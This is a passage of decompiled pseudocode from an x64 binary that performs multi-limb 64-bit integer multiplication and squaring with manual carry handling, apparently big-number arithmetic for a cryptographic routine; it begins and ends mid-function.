  v55 = v42 + 1;
  v56 = v52 + 1;
  v57 = v52 + 1;
  if ( v54 >= v53 )
    v57 = v52;
  v58 = v57 + v40;
  if ( v58 >= v57 )
    v55 = v42;
  v59 = v53 + v54;
  a1[2] = v59;
  if ( v59 >= v53 )
    v56 = v52;
  v60 = a2[3];
  v61 = v56 + v58;
  v62 = v55 + 1;
  if ( v61 >= v56 )
    v62 = v55;
  v63 = (unsigned int)*a2;
  v64 = HIDWORD(v60);
  v65 = HIDWORD(*a2);
  v66 = v65 * (unsigned int)a2[3];
  v67 = v65 * HIDWORD(v60);
  v68 = v63 * v64;
  v69 = v67 + 0x100000000i64;
  v70 = v68 + v66;
  if ( v70 >= v68 )
    v69 = v67;
  v71 = HIDWORD(v70) + v69;
  v72 = v70 << 32;
  v73 = v71 + 1;
  v74 = v72 + v63 * (unsigned int)a2[3];
  if ( v74 >= v72 )
    v73 = v71;
  v75 = v74 + v61;
  v76 = 0i64;
  v77 = v73 + 1;
  v78 = v73 + 1;
  if ( v75 >= v74 )
    v78 = v73;
  v79 = v78 + v62;
  LOBYTE(v76) = v79 < v78;
  v80 = v74 + v75;
  if ( v80 >= v74 )
    v77 = v73;
  v81 = v76 + 1;
  v82 = v77 + v79;
  if ( v82 >= v77 )
    v81 = v76;
  v83 = HIDWORD(a2[2]);
  v84 = (unsigned int)a2[1];
  v85 = v84 * v83;
  v86 = HIDWORD(a2[1]);
  v87 = v86 * v83;
  v88 = v85 + v86 * (unsigned int)a2[2];
  v89 = v87 + 0x100000000i64;
  if ( v88 >= v85 )
    v89 = v87;
  v90 = HIDWORD(v88) + v89;
  v91 = v88 << 32;
  v92 = v90 + 1;
  v93 = v91 + v84 * (unsigned int)a2[2];
  if ( v93 >= v91 )
    v92 = v90;
  v94 = v93 + v80;
  v95 = v81 + 1;
  v96 = v92 + 1;
  v97 = v92 + 1;
  if ( v94 >= v93 )
    v97 = v92;
  v98 = v97 + v82;
  if ( v98 >= v97 )
    v95 = v81;
  v99 = v93 + v94;
  a1[3] = v99;
  v100 = 0i64;
  if ( v99 >= v93 )
    v96 = v92;
  v101 = v96 + v98;
  v102 = v95 + 1;
  v103 = (unsigned int)a2[2];
  if ( v101 >= v96 )
    v102 = v95;
  v104 = HIDWORD(a2[2]);
  v105 = v104 * (unsigned int)v103;
  v106 = (v105 >> 31) + v104 * v104;
  v107 = (v105 << 33) + v103 * v103;
  v108 = v106 + 1;
  v109 = a2[3];
  if ( v107 >= v105 << 33 )
    v108 = v106;
  v110 = (unsigned int)v109;
  v111 = v107 + v101;
  v112 = (unsigned int)v109;
  v113 = v108 + 1;
  if ( v111 >= v107 )
    v113 = v108;
  v114 = v113 + v102;
  v115 = (unsigned int)a2[1];
  LOBYTE(v100) = v114 < v113;
  v116 = HIDWORD(v109);
  v117 = HIDWORD(a2[1]);
  v118 = v115 * v116;
  v119 = v117 * v116;
  v120 = v118 + v117 * v112;
  v121 = v119 + 0x100000000i64;
  if ( v120 >= v118 )
    v121 = v119;
  v122 = HIDWORD(v120) + v121;
  v123 = v120 << 32;
  v124 = v122 + 1;
  v125 = v123 + v115 * v110;
  if ( v125 >= v123 )
    v124 = v122;
  v126 = v125 + v111;
  v127 = v100 + 1;
  v128 = v124 + 1;
  v129 = v124 + 1;
  if ( v126 >= v125 )
    v129 = v124;
  v130 = v129 + v114;
  if ( v130 >= v129 )
    v127 = v100;
  v131 = v125 + v126;
  a1[4] = v131;
  if ( v131 >= v125 )
    v128 = v124;
  v132 = v128 + v130;
  v133 = v127 + 1;
  if ( v132 >= v128 )
    v133 = v127;
  v134 = HIDWORD(a2[3]);
  v135 = (unsigned int)a2[2];
  v136 = v135 * v134;
  v137 = HIDWORD(a2[2]);
  v138 = v137 * v134;
  v139 = v136 + v137 * (unsigned int)a2[3];
  v140 = v138 + 0x100000000i64;
  if ( v139 >= v136 )
    v140 = v138;
  v141 = HIDWORD(v139) + v140;
  v142 = v139 << 32;
  v143 = v141 + 1;
  v144 = v142 + v135 * (unsigned int)a2[3];
  if ( v144 >= v142 )
    v143 = v141;
  v145 = v144 + v132;
  v146 = v143 + 1;
  v147 = v143 + 1;
  if ( v145 >= v144 )
    v147 = v143;
  v148 = v147 + v133;
  LOBYTE(v28) = v148 < v147;
  v149 = v144 + v145;
  a1[5] = v149;
  v150 = a2[3];
  if ( v149 >= v144 )
    v146 = v143;
  v151 = (unsigned int)v150;
  v152 = (unsigned int)v150;
  v153 = v28 + 1;
  v154 = v146 + v148;
  if ( v154 >= v146 )
    v153 = v28;
  v155 = HIDWORD(v150);
  v156 = v155 * v152;
  v157 = (v155 * v152) << 33;
  v158 = (v156 >> 31) + v155 * v155;
  v159 = v157 + v151 * v151;
  v160 = v158 + 1;
  if ( v159 >= v157 )
    v160 = v158;
  v161 = v159 + v154;
  a1[6] = v161;
  v162 = v160 + 1;
  if ( v161 >= v159 )
    v162 = v160;
  result = v153 + v162;
  a1[7] = result;
  return result;
}

//----- (0000000140073C60) ----------------------------------------------------
unsigned __int64 __fastcall sub_140073C60(unsigned __int64 *a1, unsigned __int64 *a2)
{
  unsigned __int64 v4; // r9
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // r10
  unsigned __int64 v8; // rcx
  unsigned __int64 v9; // rbx
  unsigned __int64 v10; // rdx
  __int64 v11; // r9
  unsigned __int64 v12; // rcx
  __int64 v13; // r10
  __int64 v14; // r8
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rcx
  unsigned __int64 v19; // r8
  bool v20; // cf
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // r8
  unsigned __int64 v23; // rcx
  unsigned __int64 v24; // rdx
  unsigned __int64 v25; // r10
  unsigned __int64 v26; // r8
  unsigned __int64 v27; // rax
  __int64 v28; // r14
  unsigned __int64 v29; // rdi
  unsigned __int64 v30; // rsi
  __int64 v31; // r9
  _BOOL8 v32; // rbp
  unsigned __int64 v33; // r8
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // r8
  unsigned __int64 v36; // r9
  unsigned __int64 v37; // rcx
  unsigned __int64 v38; // rsi
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // rbp
  __int64 v41; // r9
  _BOOL8 v42; // r11
  unsigned __int64 v43; // rcx
  __int64 v44; // r8
  _BOOL8 v45; // rbx
  unsigned __int64 v46; // rax
  __int64 v47; // rdx
  unsigned __int64 v48; // rax
  __int64 v49; // rcx
  unsigned __int64 v50; // r8
  unsigned __int64 v51; // rcx
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // rdx
  unsigned __int64 v54; // r10
  unsigned __int64 v55; // rsi
  unsigned __int64 v56; // rdi
  unsigned __int64 v57; // rax
  unsigned __int64 v58; // rbp
  unsigned __int64 v59; // rsi
  unsigned __int64 v60; // rcx
  __int64 v61; // r9
  _BOOL8 v62; // rsi
  unsigned __int64 v63; // rcx
  unsigned __int64 v64; // rbp
  unsigned __int64 v65; // r10
  __int64 v66; // r8
  unsigned __int64 v67; // rax
  __int64 v68; // rdx
  unsigned __int64 v69; // rax
  __int64 v70; // rcx
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // rcx
  unsigned __int64 v73; // r8
  unsigned __int64 v74; // rdx
  unsigned __int64 v75; // r11
  unsigned __int64 v76; // rbp
  __int64 v77; // rcx
  unsigned __int64 v78; // r8
  unsigned __int64 v79; // rax
  unsigned __int64 v80; // rsi
  unsigned __int64 v81; // rbp
  __int64 v82; // r11
  unsigned __int64 v83; // rsi
  unsigned __int64 v84; // rdx
  __int64 v85; // r9
  unsigned __int64 v86; // rax
  unsigned __int64 v87; // rcx
  __int64 v88; // rdx
  unsigned __int64 v89; // r8
  __int64 v90; // rcx
  unsigned __int64 v91; // rcx
  unsigned __int64 v92; // r8
  unsigned __int64 v93; // rdx
  unsigned __int64 v94; // r10
  unsigned __int64 v95; // rbp
  __int64 v96; // rcx
  unsigned __int64 v97; // r8
  unsigned __int64 v98; // rax
  unsigned __int64 v99; // rsi
  unsigned __int64 v100; // rbp
  __int64 v101; // r11
  unsigned __int64 v102; // rsi
  __int64 v103; // rbx
  __int64 v104; // r9
  unsigned __int64 v105; // r8
  unsigned __int64 v106; // rax
  unsigned __int64 v107; // r8
  unsigned __int64 v108; // r9
  unsigned __int64 v109; // rcx
  unsigned __int64 v110; // rdx
  __int64 v111; // r10
  unsigned __int64 v112; // rsi
  __int64 v113; // r8
  unsigned __int64 v114; // rax
  unsigned __int64 v115; // rbx
  __int64 v116; // r9
  unsigned __int64 v117; // rdx
  unsigned __int64 v118; // rcx
  unsigned __int64 v119; // rax
  __int64 v120; // rdx
  unsigned __int64 v121; // r8
  __int64 v122; // rcx
  unsigned __int64 v123; // rcx
  unsigned __int64 v124; // r8
  unsigned __int64 v125; // rdx
  unsigned __int64 v126; // r10
  unsigned __int64 v127; // rsi
  __int64 v128; // rcx
  unsigned __int64 v129; // r8
  unsigned __int64 v130; // rax
  unsigned __int64 v131; // rbx
  unsigned __int64 v132; // rsi
  unsigned __int64 v133; // rdx
  unsigned __int64 v134; // rbx
  __int64 v135; // r11
  __int64 v136; // r9
  unsigned __int64 v137; // rax
  unsigned __int64 v138; // rcx
  unsigned __int64 v139; // rdx
  __int64 v140; // r8
  unsigned __int64 v141; // rax
  unsigned __int64 v142; // rcx
  unsigned __int64 v143; // r8
  unsigned __int64 v144; // rcx
  unsigned __int64 v145; // r8
  unsigned __int64 v146; // rdx
  unsigned __int64 v147; // r10
  unsigned __int64 v148; // rsi
  __int64 v149; // rcx
  unsigned __int64 v150; // r8
  unsigned __int64 v151; // rax
  unsigned __int64 v152; // rbx
  unsigned __int64 v153; // rsi
  unsigned __int64 v154; // rdx
  unsigned __int64 v155; // rbx
  __int64 v156; // rdi
  __int64 v157; // r9
  unsigned __int64 v158; // rax
  unsigned __int64 v159; // rcx
  unsigned __int64 v160; // rdx
  unsigned __int64 v161; // rax
  unsigned __int64 v162; // r8
  unsigned __int64 v163; // rcx
  unsigned __int64 v164; // rcx
  unsigned __int64 v165; // r8
  unsigned __int64 v166; // rdx
  unsigned __int64 v167; // r10
  unsigned __int64 v168; // rbx
  __int64 v169; // rcx
  unsigned __int64 v170; // r8
  unsigned __int64 v171; // rax
  unsigned __int64 v172; // rdi
  unsigned __int64 v173; // rbx
  unsigned __int64 v174; // rdx
  unsigned __int64 v175; // rdi
  __int64 v176; // r11
  __int64 v177; // r9
  unsigned __int64 v178; // rax
  unsigned __int64 v179; // rcx
  __int64 v180; // r8
  unsigned __int64 v181; // rdx
  unsigned __int64 v182; // rax
  unsigned __int64 v183; // rcx
  unsigned __int64 v184; // r8
  unsigned __int64 v185; // rcx
  unsigned __int64 v186; // r8
  unsigned __int64 v187; // rdx
  unsigned __int64 v188; // r10
  unsigned __int64 v189; // rbx
  __int64 v190; // rcx
  unsigned __int64 v191; // r8
  unsigned __int64 v192; // rax
  unsigned __int64 v193; // rdi
  unsigned __int64 v194; // rbx
  unsigned __int64 v195; // rdi
  __int64 v196; // r11
  unsigned __int64 v197; // rdx
  __int64 v198; // r9
  unsigned __int64 v199; // rcx
  unsigned __int64 v200; // rax
  __int64 v201; // rdx
  unsigned __int64 v202; // r8
  __int64 v203; // rcx
  unsigned __int64 v204; // rcx
  unsigned __int64 v205; // r8
  unsigned __int64 v206; // rdx
  unsigned __int64 v207; // r10
  unsigned __int64 v208; // rbx
  __int64 v209; // rcx
  unsigned __int64 v210; // r8
  unsigned __int64 v211; // rax
  unsigned __int64 v212; // rdi
  unsigned __int64 v213; // rbx
  __int64 v214; // r11
  unsigned __int64 v215; // rdi
  __int64 v216; // r10
  __int64 v217; // r9
  unsigned __int64 v218; // r8
  unsigned __int64 v219; // rax
  unsigned __int64 v220; // r8
  unsigned __int64 v221; // r9
  unsigned __int64 v222; // rcx
  unsigned __int64 v223; // rdx
  unsigned __int64 v224; // rdi
  unsigned __int64 v225; // rax
  __int64 v226; // r9
  unsigned __int64 v227; // rbx
  __int64 v228; // r10
  unsigned __int64 v229; // rcx
  __int64 v230; // r8
  unsigned __int64 v231; // rdx
  unsigned __int64 v232; // rax
  __int64 v233; // rdx
  unsigned __int64 v234; // r8
  __int64 v235; // rcx
  unsigned __int64 v236; // rcx
  unsigned __int64 v237; // r8
  unsigned __int64 v238; // rdx
  unsigned __int64 v239; // r10
  unsigned __int64 v240; // rdi
  unsigned __int64 v241; // r8
  unsigned __int64 v242; // rax
  unsigned __int64 v243; // rbx
  __int64 v244; // rcx
  unsigned __int64 v245; // rdi
  unsigned __int64 v246; // rdx
  unsigned __int64 v247; // rbx
  __int64 v248; // r11
  __int64 v249; // r9
  unsigned __int64 v250; // rax
  unsigned __int64 v251; // rcx
  __int64 v252; // r8
  unsigned __int64 v253; // rdx
  unsigned __int64 v254; // rax
  unsigned __int64 v255; // rcx
  unsigned __int64 v256; // r8
  unsigned __int64 v257; // rcx
  unsigned __int64 v258; // r8
  unsigned __int64 v259; // rdx
  unsigned __int64 v260; // r10
  unsigned __int64 v261; // rdi
  __int64 v262; // rcx
  unsigned __int64 v263; // r8
  unsigned __int64 v264; // rax
  unsigned __int64 v265; // rbx
  unsigned __int64 v266; // rdi
  unsigned __int64 v267; // rdx
  unsigned __int64 v268; // rbx
  __int64 v269; // r11
  __int64 v270; // r9
  unsigned __int64 v271; // rax
  unsigned __int64 v272; // rcx
  __int64 v273; // r8
  unsigned __int64 v274; // rdx
  unsigned __int64 v275; // rax
  unsigned __int64 v276; // rcx
  unsigned __int64 v277; // r8
  unsigned __int64 v278; // rcx
  unsigned __int64 v279; // r8
  unsigned __int64 v280; // rdx
  unsigned __int64 v281; // r10
  unsigned __int64 v282; // rdi
  unsigned __int64 v283; // r8
  unsigned __int64 v284; // rax
  unsigned __int64 v285; // rbx
  __int64 v286; // rcx
  unsigned __int64 v287; // rdi
  unsigned __int64 v288; // rdx
  unsigned __int64 v289; // rbx
  __int64 v290; // r11
  __int64 v291; // r9
  unsigned __int64 v292; // rax
  unsigned __int64 v293; // rcx
  __int64 v294; // r8
  unsigned __int64 v295; // rdx
  unsigned __int64 v296; // rax
  unsigned __int64 v297; // rcx
  unsigned __int64 v298; // r8
  unsigned __int64 v299; // rcx
  unsigned __int64 v300; // r8
  unsigned __int64 v301; // rdx
  unsigned __int64 v302; // r10
  unsigned __int64 v303; // rbx
  __int64 v304; // rcx
  unsigned __int64 v305; // r8
  unsigned __int64 v306; // rax
  unsigned __int64 v307; // rbx
  unsigned __int64 v308; // rdx
  unsigned __int64 v309; // rdi
  __int64 v310; // r11
  __int64 v311; // r9
  unsigned __int64 v312; // rax
  unsigned __int64 v313; // rcx
  __int64 v314; // r8
  unsigned __int64 v315; // rdx
  unsigned __int64 v316; // rax
  unsigned __int64 v317; // rcx
  unsigned __int64 v318; // r8
  unsigned __int64 v319; // rcx
  unsigned __int64 v320; // r8
  unsigned __int64 v321; // rdx
  unsigned __int64 v322; // r10
  unsigned __int64 v323; // rbx
  unsigned __int64 v324; // r8
  unsigned __int64 v325; // rax
  unsigned __int64 v326; // rdi
  __int64 v327; // rcx
  unsigned __int64 v328; // rbx
  unsigned __int64 v329; // rdx
  unsigned __int64 v330; // rdi
  __int64 v331; // r11
  __int64 v332; // r9
  unsigned __int64 v333; // rax
  unsigned __int64 v334; // rcx
  __int64 v335; // r8
  unsigned __int64 v336; // rdx
  unsigned __int64 v337; // rax
  unsigned __int64 v338; // rcx
  unsigned __int64 v339; // r8
  unsigned __int64 v340; // rcx
  unsigned __int64 v341; // r8
  unsigned __int64 v342; // rdx
  unsigned __int64 v343; // r10
  unsigned __int64 v344; // rbx
  __int64 v345; // rcx
  unsigned __int64 v346; // r8
  unsigned __int64 v347; // rax
  unsigned __int64 v348; // rdi
  unsigned __int64 v349; // rbx
  unsigned __int64 v350; // rdx
  unsigned __int64 v351; // rdi
  __int64 v352; // r11
  __int64 v353; // r9
  unsigned __int64 v354; // rax
  unsigned __int64 v355; // rcx
  __int64 v356; // r8
  unsigned __int64 v357; // rdx
  unsigned __int64 v358; // rax
  unsigned __int64 v359; // rcx
  unsigned __int64 v360; // r8
  unsigned __int64 v361; // rcx
  unsigned __int64 v362; // r8
  unsigned __int64 v363; // rdx
  unsigned __int64 v364; // r10
  unsigned __int64 v365; // rbx
  __int64 v366; // rcx
  unsigned __int64 v367; // r8
  unsigned __int64 v368; // rax
  unsigned __int64 v369; // rdi
  unsigned __int64 v370; // rbx
  __int64 v371; // r11
  unsigned __int64 v372; // rdi
  __int64 v373; // r10
  __int64 v374; // r9
  unsigned __int64 v375; // r8
  unsigned __int64 v376; // rax
  unsigned __int64 v377; // r8
  unsigned __int64 v378; // r9
  unsigned __int64 v379; // rcx
  unsigned __int64 v380; // rdx
  unsigned __int64 v381; // rdi
  unsigned __int64 v382; // rax
  __int64 v383; // r9
  unsigned __int64 v384; // rbx
  __int64 v385; // r10
  unsigned __int64 v386; // rcx
  __int64 v387; // r8
  unsigned __int64 v388; // rax
  unsigned __int64 v389; // rdx
  unsigned __int64 v390; // rax
  unsigned __int64 v391; // rcx
  unsigned __int64 v392; // r8
  unsigned __int64 v393; // rcx
  unsigned __int64 v394; // r8
  unsigned __int64 v395; // rdx
  unsigned __int64 v396; // r10
  unsigned __int64 v397; // rdi
  __int64 v398; // rcx
  unsigned __int64 v399; // r8
  unsigned __int64 v400; // rax
  unsigned __int64 v401; // rbx
  unsigned __int64 v402; // rdi
  __int64 v403; // r11
  __int64 v404; // r10
  unsigned __int64 v405; // rbx
  unsigned __int64 v406; // rdx
  __int64 v407; // r9
  unsigned __int64 v408; // rcx
  unsigned __int64 v409; // rax
  __int64 v410; // rdx
  __int64 v411; // r8
  __int64 v412; // rcx
  unsigned __int64 v413; // r8
  unsigned __int64 v414; // rcx
  unsigned __int64 v415; // r8
  unsigned __int64 v416; // rdx
  unsigned __int64 v417; // r10
  unsigned __int64 v418; // rdi
  __int64 v419; // rcx
  unsigned __int64 v420; // r8
  unsigned __int64 v421; // rax
  unsigned __int64 v422; // rbx
  unsigned __int64 v423; // rdi
  unsigned __int64 v424; // rdx
  unsigned __int64 v425; // rbx
  __int64 v426; // r11
  __int64 v427; // r9
  unsigned __int64 v428; // rax
  unsigned __int64 v429; // rcx
  unsigned __int64 v430; // rdx
  __int64 v431; // r8
  unsigned __int64 v432; // rax
  unsigned __int64 v433; // rcx
  unsigned __int64 v434; // r8
  unsigned __int64 v435; // rcx
  unsigned __int64 v436; // r8
  unsigned __int64 v437; // rdx
  unsigned __int64 v438; // r10
  unsigned __int64 v439; // rdi
  __int64 v440; // rcx
  unsigned __int64 v441; // r8
  unsigned __int64 v442; // rax
  unsigned __int64 v443; // rbx
  unsigned __int64 v444; // rdi
  __int64 v445; // r11
  __int64 v446; // r10
  unsigned __int64 v447; // rbx
  unsigned __int64 v448; // rdx
  __int64 v449; // r9
  unsigned __int64 v450; // rcx
  unsigned __int64 v451; // rax
  __int64 v452; // rdx
  __int64 v453; // r8
  __int64 v454; // rcx
  unsigned __int64 v455; // r8
  unsigned __int64 v456; // rcx
  unsigned __int64 v457; // r8
  unsigned __int64 v458; // rdx
  unsigned __int64 v459; // r10
  unsigned __int64 v460; // rbx
  __int64 v461; // rcx
  unsigned __int64 v462; // r8
  unsigned __int64 v463; // rax
  unsigned __int64 v464; // rbx
  unsigned __int64 v465; // rdx
  unsigned __int64 v466; // rdi
  __int64 v467; // r11
  __int64 v468; // r9
  unsigned __int64 v469; // rax
  unsigned __int64 v470; // rcx
  unsigned __int64 v471; // rdx
  __int64 v472; // r8
  unsigned __int64 v473; // rax
  unsigned __int64 v474; // rcx
  unsigned __int64 v475; // r8
  unsigned __int64 v476; // rcx
  unsigned __int64 v477; // r8
  unsigned __int64 v478; // rdx
  unsigned __int64 v479; // r10
  unsigned __int64 v480; // rbx
  __int64 v481; // rcx
  unsigned __int64 v482; // r8
  unsigned __int64 v483; // rax
  unsigned __int64 v484; // rdi
  unsigned __int64 v485; // rbx
  __int64 v486; // r11
  __int64 v487; // r10
  unsigned __int64 v488; // rdi
  unsigned __int64 v489; // rdx
  __int64 v490; // r9
  unsigned __int64 v491; // rax
  unsigned __int64 v492; // rcx
  __int64 v493; // rdx
  __int64 v494; // r8
  __int64 v495; // rcx
  unsigned __int64 v496; // r8
  unsigned __int64 v497; // rax
  unsigned __int64 v498; // r8
  unsigned __int64 v499; // rcx
  unsigned __int64 v500; // rdx
  unsigned __int64 v501; // r10
  unsigned __int64 v502; // rbx
  __int64 v503; // rcx
  unsigned __int64 v504; // r8
  unsigned __int64 v505; // rax
  unsigned __int64 v506; // rdi
  unsigned __int64 v507; // rbx
  __int64 v508; // r11
  unsigned __int64 v509; // rdi
  __int64 v510; // r10
  __int64 v511; // r9
  unsigned __int64 v512; // r8
  unsigned __int64 v513; // rax
  unsigned __int64 v514; // r8
  unsigned __int64 v515; // r9
  unsigned __int64 v516; // rcx
  unsigned __int64 v517; // rdx
  unsigned __int64 v518; // rdi
  unsigned __int64 v519; // rax
  __int64 v520; // r9
  unsigned __int64 v521; // rbx
  __int64 v522; // r10
  unsigned __int64 v523; // rcx
  __int64 v524; // r8
  unsigned __int64 v525; // rax
  unsigned __int64 v526; // rdx
  unsigned __int64 v527; // rax
  unsigned __int64 v528; // rcx
  unsigned __int64 v529; // r8
  unsigned __int64 v530; // rax
  unsigned __int64 v531; // r8
  unsigned __int64 v532; // rcx
  unsigned __int64 v533; // r10
  unsigned __int64 v534; // rdx
  unsigned __int64 v535; // rdi
  unsigned __int64 v536; // r8
  __int64 v537; // rcx
  unsigned __int64 v538; // rax
  unsigned __int64 v539; // rbx
  unsigned __int64 v540; // rdi
  unsigned __int64 v541; // rdx
  unsigned __int64 v542; // rbx
  __int64 v543; // r11
  __int64 v544; // r9
  unsigned __int64 v545; // rax
  unsigned __int64 v546; // rcx
  __int64 v547; // r8
  unsigned __int64 v548; // rdx
  unsigned __int64 v549; // rax
  unsigned __int64 v550; // rcx
  unsigned __int64 v551; // r8
  unsigned __int64 v552; // rax
  unsigned __int64 v553; // r8
  unsigned __int64 v554; // rcx
  unsigned __int64 v555; // rdx
  unsigned __int64 v556; // r10
  unsigned __int64 v557; // rdi
  __int64 v558; // rcx
  unsigned __int64 v559; // r8
  unsigned __int64 v560; // rax
  unsigned __int64 v561; // rbx
  unsigned __int64 v562; // rdi
  unsigned __int64 v563; // rdx
  unsigned __int64 v564; // rbx
  __int64 v565; // r11
  __int64 v566; // r9
  unsigned __int64 v567; // rax
  unsigned __int64 v568; // rcx
  __int64 v569; // r8
  unsigned __int64 v570; // rdx
  unsigned __int64 v571; // rax
  unsigned __int64 v572; // rcx
  unsigned __int64 v573; // r8
  unsigned __int64 v574; // rax
  unsigned __int64 v575; // r8
  unsigned __int64 v576; // rcx
  unsigned __int64 v577; // r10
  unsigned __int64 v578; // rdx
  unsigned __int64 v579; // rbx
  unsigned __int64 v580; // r8
  unsigned __int64 v581; // rax
  __int64 v582; // rcx
  unsigned __int64 v583; // rbx
  unsigned __int64 v584; // rdi
  __int64 v585; // r11
  unsigned __int64 v586; // rdx
  __int64 v587; // r9
  unsigned __int64 v588; // rax
  unsigned __int64 v589; // rcx
  __int64 v590; // rdx
  unsigned __int64 v591; // r8
  __int64 v592; // rcx
  unsigned __int64 v593; // rcx
  unsigned __int64 v594; // r8
  unsigned __int64 v595; // rdx
  unsigned __int64 v596; // r10
  unsigned __int64 v597; // rbx
  __int64 v598; // rcx
  unsigned __int64 v599; // r8
  unsigned __int64 v600; // rax
  unsigned __int64 v601; // rdi
  unsigned __int64 v602; // rbx
  __int64 v603; // r11
  unsigned __int64 v604; // rdi
  __int64 v605; // r10
  __int64 v606; // r9
  unsigned __int64 v607; // r8
  unsigned __int64 v608; // rax
  unsigned __int64 v609; // r9
  unsigned __int64 v610; // r8
  unsigned __int64 v611; // rcx
  unsigned __int64 v612; // rdi
  unsigned __int64 v613; // rax
  __int64 v614; // r9
  __int64 v615; // rbx
  unsigned __int64 v616; // rcx
  __int64 v617; // r8
  unsigned __int64 v618; // rax
  __int64 v619; // rdx
  unsigned __int64 v620; // rax
  __int64 v621; // rcx
  unsigned __int64 v622; // r8
  unsigned __int64 v623; // rcx
  unsigned __int64 v624; // r8
  unsigned __int64 v625; // rdx
  unsigned __int64 v626; // r10
  unsigned __int64 v627; // rdi
  __int64 v628; // rcx
  unsigned __int64 v629; // r8
  unsigned __int64 v630; // rax
  unsigned __int64 v631; // rbx
  unsigned __int64 v632; // rdi
  unsigned __int64 v633; // rdx
  unsigned __int64 v634; // rbx
  __int64 v635; // r11
  __int64 v636; // r9
  unsigned __int64 v637; // rax
  unsigned __int64 v638; // rcx
  __int64 v639; // r8
  unsigned __int64 v640; // rdx
  unsigned __int64 v641; // rax
  unsigned __int64 v642; // rcx
  unsigned __int64 v643; // r8
  unsigned __int64 v644; // rcx
  unsigned __int64 v645; // r8
  unsigned __int64 v646; // rdx
  unsigned __int64 v647; // r10
  unsigned __int64 v648; // rbx
  unsigned __int64 v649; // rcx
  unsigned __int64 v650; // rax
  unsigned __int64 v651; // r11
  unsigned __int64 v652; // rbx
  unsigned __int64 v653; // r8
  __int64 v654; // r9
  unsigned __int64 v655; // r11
  __int64 v656; // r10
  unsigned __int64 v657; // r8
  unsigned __int64 v658; // rax
  unsigned __int64 v659; // r8
  unsigned __int64 v660; // r9
  unsigned __int64 v661; // rcx
  unsigned __int64 v662; // r11
  unsigned __int64 v663; // rax
  unsigned __int64 result; // rax

  v4 = HIDWORD(*a2);
  v5 = v4 * (unsigned int)*a2;
  v6 = (v5 >> 31) + v4 * v4;
  v7 = (v5 << 33) + (unsigned int)*a2 * (unsigned __int64)(unsigned int)*a2;
  *a1 = v7;
  v8 = *a2;
  v9 = v6 + 1;
  v10 = a2[1];
  if ( v7 >= v5 << 33 )
    v9 = v6;
  v11 = (unsigned int)v8;
  v12 = HIDWORD(v8);
  v13 = (unsigned int)v10;
  v14 = v12 * (unsigned int)v10;
  v15 = HIDWORD(v10);
  v16 = v12 * HIDWORD(v10);
  v17 = v11 * v15;
  v18 = v16 + 0x100000000i64;
  v19 = v17 + v14;
  v20 = v19 < v17;
  v21 = v19;
  if ( !v20 )
    v18 = v16;
  v22 = v19 << 32;
  v23 = HIDWORD(v21) + v18;
  v24 = v23 + 1;
  v25 = v22 + v11 * v13;
  if ( v25 >= v22 )
    v24 = v23;
  v26 = v24 + 1;
  v27 = v24 + 1;
  if ( v25 + v9 >= v25 )
    v27 = v24;
  v28 = 0i64;
  v29 = v25 + v25 + v9;
  a1[1] = v29;
  if ( v29 >= v25 )
    v26 = v24;
  v30 = v26 + v27;
  v31 = (unsigned int)a2[1];
  v32 = v26 + v27 < v26;
  v33 = HIDWORD(a2[1]);
  v34 = v33 * (unsigned int)v31;
  v35 = (v34 >> 31) + v33 * v33;
  v36 = (v34 << 33) + v31 * v31;
  v37 = v35 + 1;
  if ( v36 >= v34 << 33 )
    v37 = v35;
  v38 = v36 + v30;
  v39 = v37 + 1;
  if ( v38 >= v36 )
    v39 = v37;
  v40 = v39 + v32;
  v41 = (unsigned int)*a2;
  v42 = v40 < v39;
  v43 = HIDWORD(*a2);
  v44 = v43 * (unsigned int)a2[2];
  v45 = v42 + 1;
  v46 = HIDWORD(a2[2]);
  v47 = v43 * v46;
  v48 = v41 * v46;
  v49 = v47 + 0x100000000i64;
  v50 = v48 + v44;
  if ( v50 >= v48 )
    v49 = v47;
  v51 = HIDWORD(v50) + v49;
  v52 = v50 << 32;
  v53 = v51 + 1;
  v54 = v52 + v41 * (unsigned int)a2[2];
  if ( v54 >= v52 )
    v53 = v51;
  v55 = v54 + v38;
  v56 = v53 + 1;
  v57 = v53 + 1;
  if ( v55 >= v54 )
    v57 = v53;
  v58 = v57 + v40;
  if ( v58 >= v57 )
    v45 = v42;
  v59 = v54 + v55;
  a1[2] = v59;
  v60 = *a2;
  if ( v59 >= v54 )
    v56 = v53;
  v61 = (unsigned int)v60;
  v62 = v45 + 1;
  v63 = HIDWORD(v60);
  v64 = v56 + v58;
  v65 = v64;
  v66 = v63 * (unsigned int)a2[3];
  v67 = HIDWORD(a2[3]);
  v68 = v63 * v67;
  v69 = v61 * v67;
  v70 = v68 + 0x100000000i64;
  v71 = v69 + v66;
  if ( v71 >= v69 )
    v70 = v68;
  v72 = HIDWORD(v71) + v70;
  v73 = v71 << 32;
  v74 = v72 + 1;
  v75 = v73 + v61 * (unsigned int)a2[3];
  if ( v75 >= v73 )
    v74 = v72;
  v76 = v75 + v64;
  v77 = 0i64;
  v78 = v74 + 1;
  v79 = v74 + 1;
  if ( v76 >= v75 )
    v79 = v74;
  if ( v65 >= v56 )
    v62 = v45;
  v80 = v79 + v62;
  LOBYTE(v77) = v80 < v79;
  v81 = v75 + v76;
  v20 = v81 < v75;
  v82 = v77 + 1;
  if ( !v20 )
    v78 = v74;
  v83 = v78 + v80;
  if ( v83 >= v78 )
    v82 = v77;
  v84 = HIDWORD(a2[2]);
  v85 = (unsigned int)a2[1];
  v86 = v85 * v84;
  v87 = HIDWORD(a2[1]);
  v88 = v87 * v84;
  v89 = v86 + v87 * (unsigned int)a2[2];
  v90 = v88 + 0x100000000i64;
  if ( v89 >= v86 )
    v90 = v88;
  v91 = HIDWORD(v89) + v90;
  v92 = v89 << 32;
  v93 = v91 + 1;
  v94 = v92 + v85 * (unsigned int)a2[2];
  if ( v94 >= v92 )
    v93 = v91;
  v95 = v94 + v81;
  v96 = v82 + 1;
  v97 = v93 + 1;
  v98 = v93 + 1;
  if ( v95 >= v94 )
    v98 = v93;
  v99 = v98 + v83;
  if ( v99 >= v98 )
    v96 = v82;
  v100 = v94 + v95;
  a1[3] = v100;
